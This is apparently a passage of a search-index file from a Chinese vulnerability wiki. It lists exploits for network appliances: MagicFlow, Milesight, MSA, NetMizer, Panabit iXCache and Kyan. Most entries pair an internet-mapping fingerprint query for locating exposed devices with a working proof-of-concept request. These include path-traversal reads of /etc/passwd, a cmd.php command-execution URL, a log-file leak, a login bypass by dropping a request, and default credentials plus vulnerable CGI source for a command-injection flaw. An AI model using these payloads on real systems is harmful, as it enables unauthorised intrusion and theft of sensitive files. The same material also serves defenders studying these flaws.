xmlHttp = new ActiveXObject(\"Microsoft.XMLHTTP\"); } catch (e2) { xmlHttp = false; } } if (!xmlHttp \u0026\u0026 typeof XMLHttpRequest != 'undefined') { xmlHttp = new XMLHttpRequest(); } xmlHttp.open(\"GET\", \"null.txt\", false); xmlHttp.setRequestHeader(\"Range\", \"bytes=-1\"); xmlHttp.send(null); severtime=new Date(xmlHttp.getResponseHeader(\"Date\")); //获取服务器日期 var year=severtime.getFullYear(); var month=severtime.getMonth()+1; var date=severtime.getDate(); //获取服务器时间 var hour=severtime.getHours(); var minu=severtime.getMinutes(); var seco=severtime.getSeconds(); //获取客户端时间 localtime=new Date(); //取得时间差 var jtime=Math.abs(localtime.getTime()-severtime.getTime()); var jdate=jtime/(24*60*60*1000); var jhour=jtime%(24*60*60*1000)/(60*60*1000); var jminu=jtime%(24*60*60*1000)%(60*60*1000)/(60*1000); var jsecond=jtime%(24*60*60*1000)%(60*60*1000)%(60*1000)/1000; //格式化输出客户端时间 function getClientTime(){ localtime=new Date(); var cyear=localtime.getFullYear(); var cmonth=localtime.getMonth()+1; var cdate=localtime.getDate(); var chour=localtime.getHours(); var cminu=localtime.getMinutes(); var cseco=localtime.getSeconds(); ccyear=addZero(cyear); ccmonth=addZero(cmonth); ccdate=addZero(cdate); cchour=addZero(chour); ccminu=addZero(cminu); ccseco=addZero(cseco); document.getElementById(\"clienttime\").innerHTML=ccyear+\"-\"+ccmonth+\"-\"+ccdate+\" \"+cchour+\":\"+ccminu+\":\"+ccseco; document.getElementById(\"ctime\").value= ccmonth+\"\"+ccdate+\"\"+cchour+\"\"+ccminu+\"\"+ccyear+\".\"+ccseco; } //格式化输出服务器时间 function getSeverTime(){ seco++; if(seco==60){ minu+=1; seco=0; } if(minu==60){ hour+=1; minu=0; } if(hour==24){ date+=1; hour=0; } //日期处理 if(month==1||month==3||month==5||month==7 ||month==8||month==10||month==12) { if(date==32) { date=1; month+=1; } }else if(month==4||month==6||month==9||month==11){ if(date==31){ date=1; month+=1; } }else if(month==2){ if(year%4==0\u0026\u0026year%100!=0){//闰年处理 if(date==29){ date=1; month+=1; } }else{ if(date==28){ date=1; month+=1; } } } if(month==13){ year+=1; month=1; } sseco=addZero(seco); sminu=addZero(minu); shour=addZero(hour); sdate=addZero(date); smonth=addZero(month); syear=year; document.getElementById(\"servertime\").innerHTML=syear+\"-\"+smonth+\"-\"+sdate+\" \"+shour+\":\"+sminu+\":\"+sseco; setTimeout(\"getSeverTime()\",1000); setTimeout(\"getClientTime()\",100); } function addZero(num) { num=Math.floor(num); return ((num \u003c= 9) ? (\"0\" + num) : num); } function updatetime() { return true; } \u003c/script\u003e \u003cbody onLoad=\"getSeverTime();\"\u003e \u003ctable style='width:500px' border='0' align='center' cellpadding","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"MagicFlow 防火墙网关 main.xp 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/magicflow-%E9%98%B2%E7%81%AB%E5%A2%99%E7%BD%91%E5%85%B3-main.xp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/magicflow-%E9%98%B2%E7%81%AB%E5%A2%99%E7%BD%91%E5%85%B3-main.xp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 MagicFlow 防火墙网关 main.xp 存在任意文件读取漏洞，攻击者通过构造特定的Url获取敏感文件 ","date":"0001-01-01","objectID":"/magicflow-%E9%98%B2%E7%81%AB%E5%A2%99%E7%BD%91%E5%85%B3-main.xp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/magicflow-%E9%98%B2%E7%81%AB%E5%A2%99%E7%BD%91%E5%85%B3-main.xp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 MagicFlow 防火墙网关 ","date":"0001-01-01","objectID":"/magicflow-%E9%98%B2%E7%81%AB%E5%A2%99%E7%BD%91%E5%85%B3-main.xp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/magicflow-%E9%98%B2%E7%81%AB%E5%A2%99%E7%BD%91%E5%85%B3-main.xp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"MSA/1.0\" ","date":"0001-01-01","objectID":"/magicflow-%E9%98%B2%E7%81%AB%E5%A2%99%E7%BD%91%E5%85%B3-main.xp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/magicflow-%E9%98%B2%E7%81%AB%E5%A2%99%E7%BD%91%E5%85%B3-main.xp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 构造POC /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd ","date":"0001-01-01","objectID":"/magicflow-%E9%98%B2%E7%81%AB%E5%A2%99%E7%BD%91%E5%85%B3-main.xp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/magicflow-%E9%98%B2%E7%81%AB%E5%A2%99%E7%BD%91%E5%85%B3-main.xp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Milesight Router httpd.log 信息泄漏漏洞 CVE-2023-4714 ","date":"0001-01-01","objectID":"/milesight-router-httpd.log-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-4714/:0:0","tags":null,"title":"","uri":"/milesight-router-httpd.log-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-4714/"},{"categories":null,"content":"漏洞描述 Milesight Router 存在信息泄漏漏洞，攻击者通过访问httpd.log可以获取登陆敏感日志信息 ","date":"0001-01-01","objectID":"/milesight-router-httpd.log-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-4714/:1:0","tags":null,"title":"","uri":"/milesight-router-httpd.log-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-4714/"},{"categories":null,"content":"漏洞影响 Milesight Router ","date":"0001-01-01","objectID":"/milesight-router-httpd.log-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-4714/:2:0","tags":null,"title":"","uri":"/milesight-router-httpd.log-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-4714/"},{"categories":null,"content":"网络测绘 \"rt_title\" ","date":"0001-01-01","objectID":"/milesight-router-httpd.log-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-4714/:3:0","tags":null,"title":"","uri":"/milesight-router-httpd.log-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-4714/"},{"categories":null,"content":"漏洞复现 登陆页面 poc /lang/log/httpd.log ","date":"0001-01-01","objectID":"/milesight-router-httpd.log-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-4714/:4:0","tags":null,"title":"","uri":"/milesight-router-httpd.log-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2023-4714/"},{"categories":null,"content":"Milesight VPN server.js 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 MilesightVPN 是一款软件，可使 Milesight 产品的 VPN 通道设置过程更加简便，并可通过网络服务器界面监控连接状态。其中存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感文件 ","date":"0001-01-01","objectID":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Milesight VPN ","date":"0001-01-01","objectID":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"MilesightVPN\" ","date":"0001-01-01","objectID":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC GET /../etc/passwd HTTP/1.1 Host: Accept: */* Content-Type: application/x-www-form-urlencoded ","date":"0001-01-01","objectID":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"MSA 互联网管理网关 msa 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/msa-%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3-msa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/msa-%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3-msa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 MSA 互联网管理网关存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件 ","date":"0001-01-01","objectID":"/msa-%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3-msa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/msa-%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3-msa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 MSA 互联网管理网关 ","date":"0001-01-01","objectID":"/msa-%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3-msa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/msa-%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3-msa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"互联网管理网关\" ","date":"0001-01-01","objectID":"/msa-%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3-msa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/msa-%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3-msa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /msa/../../../../etc/passwd ","date":"0001-01-01","objectID":"/msa-%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3-msa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/msa-%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3-msa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"NetMizer 日志管理系统 cmd.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 NetMizer 日志管理系统 cmd.php中存在远程命令执行漏洞，攻击者通过传入 cmd参数即可命令执行 ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 NetMizer 日志管理系统 ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"NetMizer 日志管理系统\" ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /data/manage/cmd.php?cmd=id ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"NetMizer 日志管理系统 data 目录遍历漏洞 ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-data-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-data-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 北京灵州网络技术有限公司NetMizer日志管理系统存在目录遍历漏洞，由于 /data 控制不严格，攻击者可利用该漏洞获取敏感信息。 ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-data-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-data-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 NetMizer 日志管理系统 ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-data-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-data-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"NetMizer 日志管理系统\" ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-data-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-data-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /data ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-data-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-data-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"NetMizer 日志管理系统 登录绕过漏洞 ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 NetMizer 日志管理系统存在登录绕过漏洞，通过限制某个请求包的发送获取后台权限 ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 NetMizer 日志管理系统 ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"NetMizer 日志管理系统\" ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 访问页面 main.html 并抓取请求包, 使用Burp Drop掉下面对请求包 Drop后停止抓包，成功进入后台 ","date":"0001-01-01","objectID":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Panabit iXCache date_config 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/panabit-ixcache-date_config-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/panabit-ixcache-date_config-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Panabit iXCache date_config模块存在命令拼接，导致可执行任意命令 ","date":"0001-01-01","objectID":"/panabit-ixcache-date_config-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/panabit-ixcache-date_config-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Panabit iXCache ","date":"0001-01-01","objectID":"/panabit-ixcache-date_config-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/panabit-ixcache-date_config-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"iXCache\" ","date":"0001-01-01","objectID":"/panabit-ixcache-date_config-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/panabit-ixcache-date_config-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 默认账号密码为：admin/ixcache , 存在漏洞的模块为 /cgi-bin/Maintain/date_config 找到请求方式传参可以通过查看登陆页面文件获取, 通过抓包得知验证文件为 userverify.cgi 接收请求参数的方式如下，通过快速搜索查找可能交互的地方 \"${REQUEST_METHOD}\" = \"POST\" 这样就可以快速找到可以传参交互的地方，查看的过程发现存在可控点 #!/bin/sh #This script is created by ssparser automatically. The parser first created by MaoShouyan printf \"Content-type: text/html Cache-Control: no-cache \" echo -n \"\"; . ../common/common.sh myself=\"/cgi-bin/Maintain/`basename $0`\" echo -n \" \u003cscript languate=\\\"javascript\\\"\u003e function Validate(frm) { frm.ntpserver.value = TrimAll(frm.ntpserver.value); if (frm.ntpserver.value != \\\"\\\" \u0026\u0026 !IsIPAddr(frm.ntpserver.value)) { alert(\\\"请输入IP地址!\\\"); frm.ntpserver.select(); return false; } return true; } \u003c/script\u003e \"; if [ \"${REQUEST_METHOD}\" = \"POST\" ]; then operator_check \"${myself}\" [ \"${CGI_ntpserver}\" = \"\" ] \u0026\u0026 CGI_ntpserver=\"0.0.0.0\" echo \"ntpserver_ip=${CGI_ntpserver}\" \u003e ${PGETC}/ntp.conf timefmt=\"${CGI_year}${CGI_month}${CGI_day}${CGI_hour}${CGI_minute}.${CGI_second}\" errmsg=`date ${timefmt}` [ \"${CGI_ntpserver}\" != \"0.0.0.0\" ] \u0026\u0026 ntpdate -t 10 ${CGI_ntpserver} afm_dialog_msg \"操作成功!\" fi year=`date \"+%Y\"` month=`date \"+%m\"` day=`date \"+%d\"` hour=`date \"+%H\"` minute=`date \"+%M\"` second=`date \"+%S\"` if [ -f ${PGETC}/ntp.conf ]; then . ${PGETC}/ntp.conf CGI_ntpserver=\"${ntpserver_ip}\" fi [ \"${CGI_ntpserver}\" = \"\" ] \u0026\u0026 CGI_ntpserver=\"0.0.0.0\" echo -n \" \u003cbody\u003e \"; cgi_show_title \"系统管理-\u003e系统时间\" echo -n \" \u003cbr\u003e \u003cform method=post onsubmit=\\\"return Validate(this)\\\" action=\\\"${myself}\\\"\u003e \u003ctable width=700 border=0 cellspacing=1 cellpadding=1 bgcolor=\\\"#ffffff\\\"\u003e \u003ctr id=row1 height=22\u003e \u003ctd width=40\u003e\u003c/td\u003e \u003ctd width=90 align=left\u003eNTP服务器\u003c/td\u003e \u003ctd width=* align=left\u003e \u003cinput type=text name=ntpserver style=\\\"width:120px\\\" value=\\\"${CGI_ntpserver}\\\"\u003e\u003c/input\u003e\u0026nbsp;(请输入IP地址，目前不支持域名解析,0.0.0.0表示关闭NTP)\u003c/td\u003e \u003c/tr\u003e \u003c/table\u003e \u003cbr\u003e \u003ctable width=700 border=0 cellspacing=1 cellpadding=1 bgcolor=\\\"#ffffff\\\"\u003e \u003ctr id=row1 height=22\u003e \u003ctd width=40\u003e\u003c/td\u003e \u003ctd width=90 align=left\u003e年/月/日\u003c/td\u003e \u003ctd width=* align=left\u003e \u003cselect name=year style=\\\"width:60px\\\" value=${year}\u003e \"; tmpvar=2000 while [ ${tmpvar} -le 2020 ]; do if [ ${tmpvar} -eq ${year} ]; then echo \"\u003coption value=${tmpvar} selected\u003e${tmpvar}\u003c/option\u003e\" else echo \"\u003coption value=${tmpvar}\u003e${tmpvar}\u003c/option\u003e\" fi tmpvar=$((${tmpvar} + 1)) done echo -n \"\u003c/select\u003e年 \u003cselect name=month style=\\\"width:60px\\\" value=${month}\u003e \"; tmpvar=1 